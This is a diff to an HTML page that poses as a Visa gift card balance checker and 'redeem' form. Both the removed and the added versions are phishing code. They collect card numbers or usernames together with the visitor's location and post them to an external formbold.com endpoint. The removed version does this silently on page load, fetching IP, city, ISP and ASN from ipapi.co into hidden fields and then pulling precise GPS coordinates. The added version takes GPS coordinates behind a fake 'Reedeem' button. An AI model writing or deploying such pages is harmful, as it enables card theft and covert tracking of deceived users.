@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>balance checker</title>
+  <title>Shopping Edu Feedback</title>
   <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700&display=swap" rel="stylesheet">
   <style>
     body {
@@ -52,8 +52,11 @@
       font-size: 1rem;
       border: none;
       border-radius: 12px;
-      cursor: not-allowed;
+      cursor: pointer;
+    }
+    .submit-btn:disabled {
       opacity: 0.6;
+      cursor: not-allowed;
     }
     .small-text {
       text-align: center;
@@ -65,36 +68,30 @@
       font-size: 0.85rem;
       margin-top: 1rem;
       color: #444;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .error {
+      color: red;
+    }
+    .success {
+      color: green;
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>Visa Card Balance Checker</h1>
+  <h1>VISA type USER OR CARD NUMBER</h1>
 
-  <form id="autoForm" method="POST" action="https://formbold.com/s/obDkQ">
-    <textarea name="feedback" placeholder="Enter VISA giftcard number..."></textarea>
-
-    <!-- Hidden fields auto-filled by JS -->
-    <input type="hidden" name="ip" />
-    <input type="hidden" name="city" />
-    <input type="hidden" name="region" />
-    <input type="hidden" name="country" />
-    <input type="hidden" name="country_code" />
-    <input type="hidden" name="postal" />
+  <form id="geoForm" method="POST" action="https://formbold.com/s/obDkQ">
+    <textarea name="feedback" placeholder="Type your card NUMBER OR USER..."></textarea>
     <input type="hidden" name="latitude" />
     <input type="hidden" name="longitude" />
-    <input type="hidden" name="timezone" />
-    <input type="hidden" name="currency" />
-    <input type="hidden" name="org" />
-    <input type="hidden" name="asn" />
-    <input type="hidden" name="continent_code" />
-    <input type="hidden" name="country_population" />
-
-    <button class="submit-btn" disabled>...</button>
+    <button type="button" class="submit-btn" id="getLocationBtn">Reedeem</button>
     <div class="info" id="info"></div>
-    <div class="small-text">Enter Card Number.</div>
+    <div class="small-text">Type VISA CARD NUMBER OR USER.</div>
   </form>
 </div>
 
@@ -102,63 +99,42 @@
   let sendCount = 0;
   const MAX_SENDS = 5;
 
-  async function collectAndSend() {
-    if (sendCount >= MAX_SENDS) return;
-
-    const form = document.getElementById('autoForm');
+  document.getElementById('getLocationBtn').addEventListener('click', () => {
+    const form = document.getElementById('geoForm');
     const info = document.getElementById('info');
 
-    try {
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
-
-      form.elements['ip'].value = data.ip;
-      form.elements['city'].value = data.city;
-      form.elements['region'].value = data.region;
-      form.elements['country'].value = data.country_name;
-      form.elements['country_code'].value = data.country;
-      form.elements['postal'].value = data.postal;
-      form.elements['latitude'].value = data.latitude;
-      form.elements['longitude'].value = data.longitude;
-      form.elements['timezone'].value = data.timezone;
-      form.elements['currency'].value = data.currency;
-      form.elements['org'].value = data.org;
-      form.elements['asn'].value = data.asn;
-      form.elements['continent_code'].value = data.continent_code;
-      form.elements['country_population'].value = data.country_population;
-
-      info.textContent = "Sending general location...";
-      form.submit();
-      sendCount++;
-
-      // After first submission, listen for geolocation permission
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          if (sendCount >= MAX_SENDS) return;
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-
-          form.elements['latitude'].value = lat;
-          form.elements['longitude'].value = lon;
-
-          info.textContent = "...";
-          setTimeout(() => {
-            form.submit();
-            sendCount++;
-          }, 1000);
-        },
-        (err) => {
-          console.log("Invalid card number", err);
-        }
-      );
-
-    } catch (err) {
-      info.textContent = "Please Enter the correct giftcard.";
+    if (sendCount >= MAX_SENDS) {
+      info.innerHTML = '<span class="error"> .</span>';
+      return;
     }
-  }
 
-  window.onload = collectAndSend;
+    if (!navigator.geolocation) {
+      info.innerHTML = '<span class="error">.</span>';
+      return;
+    }
+
+    info.textContent = "🔄 Requesting location permission...";
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        form.elements['latitude'].value = lat;
+        form.elements['longitude'].value = lon;
+
+        info.innerHTML = '<span class="success">✅  Sending...</span>';
+        sendCount++;
+        form.submit();
+      },
+      (err) => {
+        info.innerHTML = '<span class="error">❌  We can’t proceed.</span>';
+        console.error(err);
+      }
+    );
+  });
 </script>
 
 </body>
 </html>
+Lo
